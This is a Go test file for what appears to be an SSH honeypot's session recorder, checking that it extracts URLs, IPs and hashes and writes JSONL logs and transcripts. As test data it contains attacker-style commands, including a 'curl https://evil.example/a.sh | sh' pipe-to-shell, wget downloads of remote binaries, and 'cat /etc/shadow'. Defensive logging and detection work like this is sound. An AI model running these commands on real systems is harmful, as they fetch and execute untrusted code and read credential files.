package recorder

import (
	"bufio"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestExtract(t *testing.T) {
	text := `cd /tmp; wget http://198.51.100.23:8080/bins/x86 -O /tmp/x; ` +
		`curl https://evil.example/a.sh | sh; ping 8.8.8.8; ` +
		`echo e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
	i := Extract(text)
	if len(i.URLs) != 2 {
		t.Errorf("URLs = %v", i.URLs)
	}
	// 198.51.100.23 is inside a URL and must not repeat; 8.8.8.8 stands alone.
	if len(i.IPs) != 1 || i.IPs[0] != "8.8.8.8" {
		t.Errorf("IPs = %v", i.IPs)
	}
	if len(i.Hashes) != 1 || !strings.HasPrefix(i.Hashes[0], "e3b0c442") {
		t.Errorf("Hashes = %v", i.Hashes)
	}
	if Extract("just a normal command ls -la").Empty() != true {
		t.Error("expected no IOCs")
	}
}

func TestRecorderWritesJSONLAndTranscript(t *testing.T) {
	dir := t.TempDir()
	r := New(dir)
	at := time.Date(2026, 9, 17, 8, 30, 0, 0, time.UTC)
	s := r.Begin("20260917T083000-abcd", "203.0.113.9:51234", at)
	s.Auth("password", "root", "admin123", "", "", false)
	s.Auth("password", "root", "root", "", "", true)
	s.Session(true, "xterm", "")
	s.Command("wget http://1.2.3.4/x -O /tmp/x", "/root", "root", 0)
	s.Download("wget", "http://1.2.3.4/x", "GET", "/tmp/x")
	s.Command("cat /etc/shadow", "/root", "root", 0)
	s.End(nil, at.Add(42*time.Second))

	base := filepath.Join(dir, "sessions", "2026-09-17", "20260917T083000-abcd")
	data, err := os.ReadFile(base + ".jsonl")
	if err != nil {
		t.Fatal(err)
	}
	var types []string
	sc := bufio.NewScanner(strings.NewReader(string(data)))
	var seqs []int
	for sc.Scan() {
		var e Event
		if err := json.Unmarshal(sc.Bytes(), &e); err != nil {
			t.Fatalf("bad JSONL line: %v", err)
		}
		types = append(types, string(e.Type))
		seqs = append(seqs, e.Seq)
		if e.Type == EventCommand && e.Command == "wget http://1.2.3.4/x -O /tmp/x" {
			if e.IOCs == nil || len(e.IOCs.URLs) != 1 {
				t.Errorf("command event missing IOCs: %+v", e.IOCs)
			}
			if e.ExitCode == nil || *e.ExitCode != 0 {
				t.Error("missing exit code")
			}
		}
	}
	want := []string{"connect", "auth", "auth", "session", "command", "download", "command", "disconnect"}
	if strings.Join(types, ",") != strings.Join(want, ",") {
		t.Errorf("event types = %v, want %v", types, want)
	}
	// Sequence numbers are monotonic from 1.
	for i, seq := range seqs {
		if seq != i+1 {
			t.Errorf("seq[%d] = %d", i, seq)
		}
	}

	tr, err := os.ReadFile(base + ".log")
	if err != nil {
		t.Fatal(err)
	}
	trs := string(tr)
	for _, want := range []string{"ACCEPTED", "FAILED", "cat /etc/shadow", "[download] wget", "disconnected after"} {
		if !strings.Contains(trs, want) {
			t.Errorf("transcript missing %q:\n%s", want, trs)
		}
	}
}

func TestRecorderSurvivesUnwritableDir(t *testing.T) {
	// A recorder that cannot open files must not panic; it just discards.
	r := New("/proc/nonexistent/cannot/create")
	s := r.Begin("x", "1.2.3.4:1", time.Now())
	s.Auth("password", "root", "x", "", "", true)
	s.Command("ls", "/root", "root", 0)
	s.End(nil, time.Now())
}
